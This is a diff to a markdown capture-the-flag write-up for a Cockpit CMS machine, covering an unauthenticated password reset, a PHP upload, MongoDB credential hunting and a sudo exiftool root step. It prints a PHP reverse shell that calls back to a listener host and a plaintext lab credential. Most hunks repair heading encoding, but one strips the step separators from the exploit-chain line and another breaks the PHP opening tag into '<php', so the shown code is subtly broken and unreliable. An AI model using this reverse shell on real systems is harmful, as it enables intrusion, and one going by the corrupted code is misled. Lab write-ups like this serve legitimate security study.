@@ -4,7 +4,7 @@
 **OS:** Linux (Ubuntu 16.04)
 **Difficulty:** Medium
 **Tech stack:** Apache 2.4.18, Cockpit CMS 0.11.1 (PHP), MongoDB
-**Exploit chain:** Cockpit user enum + reset (CVE-2020-35846) ? admin login ? PHP upload ? `www-data` shell ? MongoDB enumeration ? `stux:p4ssw0rdhack3d!123` ? `sudo exiftool -filename=` ? root flag in `stux`'s home
+**Exploit chain:** Cockpit user enum + reset (CVE-2020-35846)  admin login  PHP upload  `www-data` shell  MongoDB enumeration  `stux:p4ssw0rdhack3d!123`  `sudo exiftool -filename=`  root flag in `stux`'s home
 
 ---
 
@@ -35,10 +35,10 @@ sudo exiftool -filename=/home/stux/root.txt /root/root.txt -> root flag
 ## Table of Contents
 1. [Reconnaissance](#1-reconnaissance)
 2. [Cockpit Fingerprint](#2-cockpit-fingerprint)
-3. [Initial Access Â— Cockpit Unauth Reset + PHP Upload](#3-initial-access--cockpit-unauth-reset--php-upload)
+3. [Initial Access — Cockpit Unauth Reset + PHP Upload](#3-initial-access--cockpit-unauth-reset--php-upload)
 4. [Post-Exploitation (`www-data`)](#4-post-exploitation-www-data)
-5. [User Â— MongoDB Enumeration](#5-user--mongodb-enumeration)
-6. [Root Â— `sudo exiftool` Filename Move](#6-root--sudo-exiftool-filename-move)
+5. [User — MongoDB Enumeration](#5-user--mongodb-enumeration)
+6. [Root — `sudo exiftool` Filename Move](#6-root--sudo-exiftool-filename-move)
 7. [Key Takeaways](#7-key-takeaways)
 
 ---
@@ -83,7 +83,7 @@ Tools: [curl](../../../tools/web/curl.md), [searchsploit](../../../tools/recon/s
 
 ---
 
-## 3. Initial Access Â— Cockpit Unauth Reset + PHP Upload
+## 3. Initial Access — Cockpit Unauth Reset + PHP Upload
 
 Full technique: [cockpit-cms-rce.md](../../../exploits/web-rce/cockpit-cms-rce.md).
 
@@ -99,7 +99,7 @@ python3 enumeration.py http://$TARGET
 ### 3b. Login + upload `shell.php`
 Open `/auth/login`, log in with the new admin password, go to **Assets** and upload:
 ```php
-<?php
+<php
 system('bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"');
 ```
 
@@ -156,7 +156,7 @@ pgrep -a mongod
 
 ---
 
-## 5. User Â— MongoDB Enumeration
+## 5. User — MongoDB Enumeration
 
 Full technique: [mongodb-enumeration.md](../../../techniques/creds/mongodb-enumeration.md).
 
@@ -195,7 +195,7 @@ Tools: [mongo](../../../tools/database/mongo.md).
 
 ---
 
-## 6. Root Â— `sudo exiftool` Filename Move
+## 6. Root — `sudo exiftool` Filename Move
 
 Full technique: [exiftool-sudo-cve-2021-22204.md](../../../privesc/linux/exiftool-sudo-cve-2021-22204.md).
 
